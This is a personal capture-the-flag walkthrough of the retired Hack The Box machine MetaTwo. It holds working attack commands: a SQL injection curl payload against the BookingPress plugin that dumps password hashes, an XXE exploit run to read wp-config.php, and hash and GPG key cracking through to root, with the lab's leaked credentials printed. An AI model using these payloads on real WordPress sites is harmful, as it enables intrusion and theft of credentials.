# [MetaTwo](https://app.hackthebox.com/machines/504) <!-- omit in toc --> 

This is my second hacked machine, a retired one. Let's start!

## Table of Contents  <!-- omit in toc --> 
- [User Access](#user-access)
- [Privilege Escalation](#privilege-escalation)
- [Final Thoughts](#final-thoughts)


## User Access

Let's begin with some enumeration, as usual with our nmap tool:

```console
$ nmap -p- -sV 10.10.11.186  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 08:41 EDT
Nmap scan report for metatwo.htb (10.10.11.186)
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=4/30%Time=644E620C%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.98 seconds
```

So, we have FTP, SSH and HTTP ports open. If we navigate to the machine address we get redirected to *metapress.htb*, as usual we just add that entry to our */etc/hosts/* file and we refresh the page.
We get presented a simple **wordpress** website with a page under */events* to do some kind of reservation for a meeting event. Let's try to do some enumeration of this wordpress page using *wpscan*.

```console
$ wpscan --url http://metapress.htb/events --wp-content-dir http://metapress.htb/wp-content

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/events/ [10.10.11.186]
[+] Started: Sun Apr 30 09:25:12 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] bookingpress-appointment-booking
 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Last Updated: 2023-04-07T07:06:00.000Z
 | [!] The version is out of date, the latest version is 1.0.58
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | Confirmed By: Translation File (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Apr 30 09:25:19 2023
[+] Requests Done: 168
[+] Cached Requests: 10
[+] Data Sent: 51.45 KB
[+] Data Received: 373.783 KB
[+] Memory used: 245.566 MB
[+] Elapsed time: 00:00:07
```

We got some useful findings:
- An out of theme theme called *twentytwentyone*
- An out of theme plugin called *bookingpress-appointment-booking*

Since I don't have a WPScan API token for vulnerabilities detections I just used Google to follow the more promising path, looking for vulnerabilities into the booking plugin.
It looks like there is a vulnerability (CVE-2022-0739) described [here](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) for any version < 1.0.11 so it looks like we can exploit it. 

First we need to obtain a valid *wp-nonce* token from the website:

```console
$ curl -vs http://metapress.htb/events/ 2&>1 | grep wpnonce   
...                                
var postData = { action:'bookingpress_front_get_timings', service_id: selected_service_id, selected_date: formatted_date,_wpnonce:'5ca3823e1a' };
```

Now that we got our wordpress nonce token (*5ca3823e1a*), we can try the SQL injection to extract some data from the database.

```console
$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=5ca3823e1a&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users -- -'     

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 30 Apr 2023 13:46:21 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"admin","bookingpress_category_id":"admin@metapress.htb","bookingpress_service_name":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.","bookingpress_service_price":"$0.00","bookingpress_service_duration_val":null,"bookingpress_service_duration_unit":null,"bookingpress_service_description":null,"bookingpress_service_position":null,"bookingpress_servicedate_created":null,"service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"manager","bookingpress_category_id":"manager@metapress.htb","bookingpress_service_name":"$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70","bookingpress_service_price":"$0.00","bookingpress_service_duration_val":null,"bookingpress_service_duration_unit":null,"bookingpress_service_description":null,"bookingpress_service_position":null,"bookingpress_servicedate_created":null,"service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

Looks like we managed to get some information about the users inside the database

| Username |         Email         |             Password Hash             |
| :------: | :-------------------: | :-----------------------------------: |
|  admin   |  admin@metapress.htb  | \$P\$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.  |
| manager  | manager@metapress.htb | \$P\$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70 |

At this point it's worth trying some dictionary attack on the password hashes to see if we can manage to get the clear text passwords. I'm using *hashcat* with the famous [rockyou](https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt) wordlist which is built in kali linux.

```console
$ hashcat hash_to_crash.txt /usr/share/wordlists/rockyou.txt
...
```

After a while, depending on your computer power, you will discover that the *manager* user password is *partylikearockstar* while the admin password is not contained in the word list file that I used and maybe it's a strong password. 
At this point we can jump in the administration panel to see what we can do as *manager*. The generic wordpress login page is at */wp-login.php* and this website is no exception. After logging in as *manager* you will realize that this user cannot do much except for uploading media files, and files like *php* files get rejected. At this point, knowing from the previous enumeration that the wordpress version is 5.6.2 I started googling for some possible vulnerabilities. The exploitable vulnerability is [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447) which has been patched in version 5.7.1. This vulnerability allows an authenticated user that can upload media files to steal files from the server abusing an XML parsing issue in the media library. I used this [PoC](https://packetstormsecurity.com/files/164198/WordPress-5.7-Media-Library-XML-Injection.html) script to exploit the vulnerability. 

```console
$ ./exploit.sh metapress.htb manager partylikearockstar ./../wp-config.php 10.10.14.14

=====================================
CVE-2021-29447 - WordPress 5.6-5.7 - XXE & SSRF Within the Media Library (Authenticated)
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================
[*] Test connection to WordPress...
[+] Authentication successfull!!!
[+] Create payload.wav
[+] Getting Wp Nonce ... 
[+] Wp Nonce retrieved successfully ! _wpnonce : 93ccc9bd81
[+] Uploading the wav file ... 
[-] Failed to receive a response for uploaded! Try again . 

[+] Obtaining file information...
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

I managed to get the *wp-config.php* but you can basically get any file from the server filesystem such as */etc/passwd*. The *wp-config.php* contains very precious information about the wordpress configuration, and here we got both the database credentials and the FTP one. 

After accessing the FTP server using FileZilla, you will find two different folders: *blog* and *mailer*. Inside the *blog* folder you can find all the wordpress related files while inside the *mailer* folder you will find a very useful file called *send_email.php* which contains some more credentials of a user called *jnelson* for some PHP mail configurations. If you previously enumerated */etc/passwd* file you know that *jnelson* is also the name of the system user with uid 1000. Password are very often recycled and this is no exception.

```console
$ ssh jnelson@metapress.htb                              
jnelson@metapress.htb's password: *****************
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 30 10:29:47 2023 from 10.10.14.70

jnelson@meta2:~$
```

The first flag is inside *user.txt*, done with the first part.

## Privilege Escalation

After finally being able to login as *jnelson* and realizing it doesn't have any *sudo* commands capabilities, if you look into the home of the user, you will instantly find something very suspicious.

```console
jnelson@meta2:~$ ls -al
total 40
drwxr-xr-x 6 jnelson jnelson 4096 Apr 30 16:07 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwx------ 2 jnelson jnelson 4096 Apr 30 03:57 .gnupg
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
drwx------ 2 jnelson jnelson 4096 Apr 30 04:03 .ssh
-rw-r----- 1 root    jnelson   33 Apr 29 09:47 user.txt
```

You will see an hidden folder called *passpie* and after some googling you will realize that that [passpie](https://github.com/marcwebbie/passpie) is a CLI password manager which uses gpg to store credentials. Let's copy the *.keys* file from the meta2 server to us to try to crack it. 

```console
$ scp jnelson@metapress.htb:~/.passpie/.keys passpiekeys
```

Hashcat doesn't support gpg format so we're going to use johntheripper, but first we need to convert the keys format. Just remove the public key part from the file then:

```console
$ gpg2john passpiekeys > keys.txt
```

And after that let's run johntheripper.

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt keys.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:01 DONE (2023-04-30 11:17) 0.6329g/s 106.3p/s 106.3c/s 106.3C/s peanut..987654
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And in just a few seconds will know that the Passpie password is *blink182*. Now let's get get back to the box and finish the escalation with: 

```console
jnelson@meta2:~$ passpie export /tmp/passdump.txt
Passphrase: *********
jnelson@meta2:~$ cat /tmp/passdump.txt 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
jnelson@meta2:~$ su root
Password: **************
root@meta2:/home/jnelson#
```

There we go! As usual, the root flag is in *~/root.txt* file. 

## Final Thoughts

This box was fun and taught me a lot about wordpress vulnerabilities and hash cracking forcing me to learn a bit more about tools like [hashcat](https://hashcat.net/hashcat/) and [johntheripper](https://www.openwall.com/john/).